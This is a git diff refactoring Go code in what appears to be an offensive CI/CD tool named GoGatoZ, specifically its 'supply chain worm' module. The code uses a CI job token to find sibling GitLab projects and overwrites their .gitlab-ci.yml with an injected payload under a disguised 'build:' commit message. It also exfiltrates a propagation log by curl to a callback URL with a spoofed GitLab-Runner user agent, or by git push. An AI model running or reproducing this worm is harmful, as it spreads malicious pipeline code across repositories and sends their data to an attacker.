@@ -102,37 +102,37 @@ _WORM() {
 
 	switch o.Discovery {
 	case "path":
-		b.WriteString(fmt.Sprintf(`  # Search by path pattern: %s
+		fmt.Fprintf(&b, `  # Search by path pattern: %s
   _sibling_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "%s/api/v4/projects?search=%s&per_page=100" 2>/dev/null)
   if [ -n "$_sibling_json" ]; then
     _sib_count=$(echo "$_sibling_json" | grep -c '"path_with_namespace"' || echo 0)
     echo "[+] Found $_sib_count sibling repos matching path pattern"
   fi
-`, o.DiscoveryVal, getBaseURL(), o.DiscoveryVal))
+`, o.DiscoveryVal, getBaseURL(), o.DiscoveryVal)
 	case "topic":
-		b.WriteString(fmt.Sprintf(`  # Search by topic: %s
+		fmt.Fprintf(&b, `  # Search by topic: %s
   _sibling_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "%s/api/v4/projects?search=%s&per_page=100" 2>/dev/null)
   if [ -n "$_sibling_json" ]; then
     _sib_count=$(echo "$_sibling_json" | grep -c '"path_with_namespace"' || echo 0)
     echo "[+] Found $_sib_count sibling repos matching topic"
   fi
-`, o.DiscoveryVal, getBaseURL(), o.DiscoveryVal))
+`, o.DiscoveryVal, getBaseURL(), o.DiscoveryVal)
 	case "language":
-		b.WriteString(fmt.Sprintf(`  # Search by language: %s
+		fmt.Fprintf(&b, `  # Search by language: %s
   _sibling_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "%s/api/v4/projects?search=%s&per_page=100&search_namespaces=true" 2>/dev/null)
   if [ -n "$_sibling_json" ]; then
     _sib_count=$(echo "$_sibling_json" | grep -c '"path_with_namespace"' || echo 0)
     echo "[+] Found $_sib_count repos with language filter"
   fi
-`, o.DiscoveryVal, getBaseURL(), o.DiscoveryVal))
+`, o.DiscoveryVal, getBaseURL(), o.DiscoveryVal)
 	default:
-		b.WriteString(fmt.Sprintf(`  # Generic discovery — search all projects in namespace
+		fmt.Fprintf(&b, `  # Generic discovery — search all projects in namespace
   _sibling_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "%s/api/v4/projects?membership=true&per_page=100" 2>/dev/null)
-`, getBaseURL()))
+`, getBaseURL())
 	}
 
 	// Step 3: Payload injection
@@ -151,17 +151,11 @@ _WORM() {
 
 `)
 
-	// Payload injection mechanism
-	payload := o.Payload
-	if payload == "" {
-		payload = "echo INJECTED"
-	}
-
-	b.WriteString(fmt.Sprintf(`
+	fmt.Fprintf(&b, `
 
       # Try using CI_JOB_TOKEN for injection
       _target_url="%s/api/v4/projects/%s"
-`, getBaseURL(), "$(echo $_ns | sed 's|/|%2F|g')"))
+`, getBaseURL(), "$(echo $_ns | sed 's|/|%2F|g')")
 	b.WriteString(`
       # Fetch the CI file or main script
       _file_content=$(curl -sS --fail -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
@@ -187,7 +181,7 @@ _WORM() {
 `)
 
 	// Push the injected file back
-	b.WriteString(fmt.Sprintf(`
+	fmt.Fprintf(&b, `
         # Commit the modified CI file
         echo 'commit_injected' | openssl base64 -d > "$_wdir/action.json" 2>/dev/null
 
@@ -208,10 +202,11 @@ _WORM() {
   else
     echo "[-] No sibling repos found"
   fi
-`, o.DelayMinutes))
+`, o.DelayMinutes)
 
 	// Step 4: Exfiltration
-	if o.ExfilMethod == "http" || o.ExfilMethod == "" {
+	switch o.ExfilMethod {
+	case "http", "":
 		target := o.ExfilTarget
 		if target == "" {
 			target = o.CallbackURL
@@ -219,7 +214,11 @@ _WORM() {
 		if target == "" {
 			target = getBaseURL()
 		}
-		b.WriteString(fmt.Sprintf(`
+		method := o.ExfilMethod
+		if method == "" {
+			method = "http"
+		}
+		fmt.Fprintf(&b, `
 
   # Step 4: Exfiltrate propagation log
   echo "[*] Exfiltrating via %s to %s"
@@ -228,9 +227,9 @@ _WORM() {
     -H "User-Agent: GitLab-Runner/16.0" \
     --data-binary @"$_wdir/worm_log.tgz" \
     "%s" >/dev/null 2>&1 || true
-`, o.ExfilMethod, target, target))
-	} else if o.ExfilMethod == "git" {
-		b.WriteString(fmt.Sprintf(`
+`, method, target, target)
+	case "git":
+		fmt.Fprintf(&b, `
 
   # Step 4: Backup exfil via git
   _bdir=$(mktemp -d)
@@ -242,7 +241,7 @@ _WORM() {
   git add -A
   git commit -q -m "worm-exfil" 2>/dev/null
   git push -q origin HEAD 2>/dev/null || true
-`, o.ExfilTarget))
+`, o.ExfilTarget)
 	}
 
 	// Cleanup
@@ -296,19 +295,38 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 		payload = "echo '[*] Supply chain worm payload executed'"
 	}
 
-	// Verify group exists (resolve path → ID)
 	_, _, err := client.Groups.GetGroup(groupPath, nil, gitlab.WithContext(ctx))
 	if err != nil {
 		res.Err = fmt.Sprintf("resolve group: %v", err)
 		return res
 	}
 
-	// List sibling repos via Project listing (search by namespace path)
-	var siblings []int64
 	var targetPath string
-	if p, _, err := client.Projects.GetProject(targetProjectID, nil, gitlab.WithContext(ctx)); err == nil {
+	if p, _, perr := client.Projects.GetProject(targetProjectID, nil, gitlab.WithContext(ctx)); perr == nil {
 		targetPath = p.PathWithNamespace
 	}
+
+	siblings, listErr := discoverSiblings(ctx, client, groupPath, targetPath, maxRepos)
+	if listErr != "" {
+		res.Err = listErr
+	}
+
+	atk := newAttackerFromClient(client, authorName, authorEmail)
+	for _, sibID := range siblings {
+		ciYAML := buildWormCI(ctx, client, sibID, payload)
+		msg := fmt.Sprintf("build: supply chain worm propagation via %s", targetPath)
+		if err := injectWormPayload(ctx, atk, sibID, branch, ciYAML, msg, out); err != nil {
+			res.Failed++
+			continue
+		}
+		res.Promoted++
+		res.Targets = append(res.Targets, fmt.Sprintf("%d", sibID))
+	}
+	return res
+}
+
+func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, targetPath string, maxRepos int) ([]int64, string) {
+	var siblings []int64
 	page := int64(1)
 	for {
 		projOpts := &gitlab.ListProjectsOptions{
@@ -321,8 +339,7 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 		}
 		projects, resp, err := client.Projects.ListProjects(projOpts, gitlab.WithContext(ctx))
 		if err != nil {
-			res.Err = fmt.Sprintf("list projects: %v", err)
-			break
+			return siblings, fmt.Sprintf("list projects: %v", err)
 		}
 		for _, p := range projects {
 			if p.PathWithNamespace == targetPath || p.Namespace == nil || p.Namespace.FullPath != groupPath {
@@ -338,21 +355,20 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 		}
 		page = resp.NextPage
 	}
+	return siblings, ""
+}
 
-	// Inject worm payload into each sibling
-	for _, sibID := range siblings {
-		var ciYAML string
-		// Try to fetch existing CI file
-		f, _, ferr := client.RepositoryFiles.GetFile(
-			sibID, ".gitlab-ci.yml",
-			&gitlab.GetFileOptions{Ref: new("main")},
-			gitlab.WithContext(ctx),
-		)
-		if ferr == nil && f != nil {
-			decoded, _ := base64.StdEncoding.DecodeString(f.Content)
-			ciYAML = "# Auto-injected by GoGatoZ supply chain worm\n" + payload + "\n" + string(decoded)
-		} else {
-			ciYAML = fmt.Sprintf(`
+func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payload string) string {
+	f, _, ferr := client.RepositoryFiles.GetFile(
+		sibID, ".gitlab-ci.yml",
+		&gitlab.GetFileOptions{Ref: new("main")},
+		gitlab.WithContext(ctx),
+	)
+	if ferr == nil && f != nil {
+		decoded, _ := base64.StdEncoding.DecodeString(f.Content)
+		return "# Auto-injected by GoGatoZ supply chain worm\n" + payload + "\n" + string(decoded)
+	}
+	return fmt.Sprintf(`
 stages: [worm]
 worm-inject:
   stage: worm
@@ -361,34 +377,25 @@ worm-inject:
     - echo "[*] Supply chain worm propagation complete"
   allow_failure: true
 `, payload)
-		}
+}
 
-		msg := fmt.Sprintf("build: supply chain worm propagation via %s", targetPath)
-		atk := newAttackerFromClient(client, authorName, authorEmail)
-
-		if err := atk.EnsureBranch(ctx, sibID, branch); err != nil {
-			res.Failed++
-			if out != nil {
-				fmt.Fprintf(out, "[-] Failed to ensure branch on %d: %v\n", sibID, err)
-			}
-			continue
-		}
-
-		if err := atk.UpsertFile(ctx, sibID, branch, ".gitlab-ci.yml", ciYAML, msg); err != nil {
-			res.Failed++
-			if out != nil {
-				fmt.Fprintf(out, "[-] Failed to commit to %d: %v\n", sibID, err)
-			}
-			continue
-		}
-		res.Promoted++
-		res.Targets = append(res.Targets, fmt.Sprintf("%d", sibID))
+func injectWormPayload(ctx context.Context, atk *wormAttacker, sibID int64, branch, ciYAML, msg string, out io.Writer) error {
+	if err := atk.EnsureBranch(ctx, sibID, branch); err != nil {
 		if out != nil {
-			fmt.Fprintf(out, "[+] Worm propagated to %d\n", sibID)
+			fmt.Fprintf(out, "[-] Failed to ensure branch on %d: %v\n", sibID, err)
 		}
+		return err
 	}
-
-	return res
+	if err := atk.UpsertFile(ctx, sibID, branch, ".gitlab-ci.yml", ciYAML, msg); err != nil {
+		if out != nil {
+			fmt.Fprintf(out, "[-] Failed to commit to %d: %v\n", sibID, err)
+		}
+		return err
+	}
+	if out != nil {
+		fmt.Fprintf(out, "[+] Worm propagated to %d\n", sibID)
+	}
+	return nil
 }
 
 // newAttackerFromClient is a local helper so this package doesn't import attack.
